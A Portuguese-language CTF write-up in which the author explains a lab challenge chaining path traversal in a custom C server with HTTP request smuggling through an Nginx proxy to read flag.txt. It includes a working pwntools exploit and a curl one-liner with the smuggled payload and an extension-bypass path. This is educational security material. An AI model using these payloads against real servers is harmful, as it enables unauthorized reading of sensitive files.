# 🦆 DuckWare - Análise e Exploração de HTTP Smuggling + Path Traversal

> Autor: @Piceli

Este write-up documenta a resolução de um desafio CTF proposto pelo coordenador @Pira que combina duas vulnerabilidades clássicas: **Path Traversal** e **HTTP Request Smuggling**. A proposta envolve acessar arquivos sensíveis fora da pasta pública, mesmo com a presença de um proxy reverso (Nginx) configurado para mitigar tais ataques.

---

## 🔎 Visão Geral do Desafio

- **Servidor Web Customizado** em C
- **Proxy Reverso** com Nginx
- Arquivos públicos disponíveis na pasta `public/`
- Objetivo: **Ler o arquivo `flag.txt`** fora da pasta permitida

O desafio nos forneceu alguns pontos cruciais para análise:
- Código-fonte do backend
- Configuração do Nginx
- Pasta contendo o Docker e todas as configurações

---

## 🧬 Análise do Código Backend (C)

### Função de leitura de arquivos:
```c
FileWithSize *read_file(char *filename) {
    if (!ends_with(filename, ".html") && !ends_with(filename, ".png") &&
        !ends_with(filename, ".css") && !ends_with(filename, ".js")) return NULL;

    char real_path[BUFFER_SIZE];
    snprintf(real_path, sizeof(real_path), "public/%s", filename);
    FILE *fd = fopen(real_path, "r");
    // ...
}
```

### Observações:
- O backend **impede o acesso a arquivos sem extensões específicas**.
- No entanto, **não há sanitização de diretórios** — ou seja, `../` passa despercebido.
- Assim, caminhos como `../../flag.txt.js` se tornam válidos para o sistema de arquivos (resolvido como `flag.txt`).

---

## 🛡️ Barreiras Impostas pelo Proxy (Nginx)

A configuração do Nginx:
```nginx
location / {
    proxy_pass http://backend;
    proxy_set_header Host $host;
}
```

- O Nginx **remove automaticamente sequências como `../`** ao normalizar o caminho da URL.
- Consequência: não é possível realizar path traversal diretamente pela porta 8081.

---

## 💡 Abordagem: HTTP Request Smuggling

### Por que isso funciona?

O backend lê diretamente da conexão com:
```c
void handle_client(int socket_id) {
    while (1) {
        read(socket_id, buffer, BUFFER_SIZE);
        sscanf(buffer, "GET /%s", requested_filename);
        FileWithSize *file = read_file(requested_filename);
        // ...
    }
}
```

- Ele mantém a **conexão viva e processa múltiplas requisições**.
- Podemos explorar isso ao **injetar múltiplas requisições em uma única conexão** TCP.

---

## 🧪 Código de Exploração em Python

```python
from pwn import *

def pad(path):
    assert len(path) <= 1016
    prefix = '/' * (1016 - len(path))
    return prefix + path + '.js'

r = remote('localhost', 8081)

path = pad('../../flag.txt')
payload = (
    'GET /index.html HTTP/1.1\r\n'
    'Content-Length: 1024\r\n'
    'Host: localhost\r\n'
    f'Foo: {"a"*931}\r\n'
    '\r\n'

    f'GET /{path}'
    'GET /index.html HTTP/1.1\r\n'
    'Content-Length: 0\r\n'
    'Host: localhost\r\n'
    '\r\n'
)

r.send(payload.encode())
r.interactive()
```

### Estratégia:
1. A primeira requisição tem `Content-Length: 1024`, permitindo que dados extras sejam interpretados.
2. Uma segunda requisição é embutida diretamente após o cabeçalho.
3. O backend, lendo diretamente do socket, trata essa requisição maliciosa como legítima.
4. O path `../../flag.txt.js` passa no filtro de extensão e retorna o conteúdo da flag.

---

## 🧰 Alternativa: Exploração via `curl`

Também é possível realizar o mesmo ataque utilizando o `curl` com o protocolo HTTP/1.1:

```bash
curl -v --http1.1 http://localhost:8081 \
  -H "Host: localhost" \
  -H "Content-Length: 1024" \
  -H "Foo: $(python3 -c 'print("a"*931)')" \
  --data-binary $'GET /'$(python3 -c 'print("/"*(1016-len("../../flag.txt")) + "../../flag.txt.js")')$'GET /index.html HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n\r\n'
```

### Por que essa versão funciona:

- O parâmetro `--data-binary` permite enviar uma sequência bruta de dados no corpo da requisição, permitindo a injeção precisa do payload.
- O cabeçalho `Content-Length: 1024` engana o backend, fazendo-o acreditar que o corpo é extenso e que há mais dados a serem processados.
- A estrutura do payload introduz uma nova requisição **dentro** do corpo da primeira.
- O uso de `/` repetidos ajusta o comprimento total do path para que fique alinhado com o buffer esperado pelo backend.
- `curl` com `--http1.1` garante a persistência da conexão, essencial para o sucesso do smuggling.

---

## ✅ Conclusão

- A falha ocorre pela **confiança do backend em caminhos fornecidos sem sanitização**, e pelo uso incorreto de `Content-Length`.
- A proteção do Nginx se mostrou ineficaz frente ao **uso de HTTP smuggling**, já que o proxy não inspeciona o corpo da requisição.
- O ataque é efetivo pela **combinação de múltiplas falhas**:
  - Permissividade de extensões (`.js` como bypass)
  - Falta de validação de diretórios
  - Arquitetura do backend com conexões persistentes.


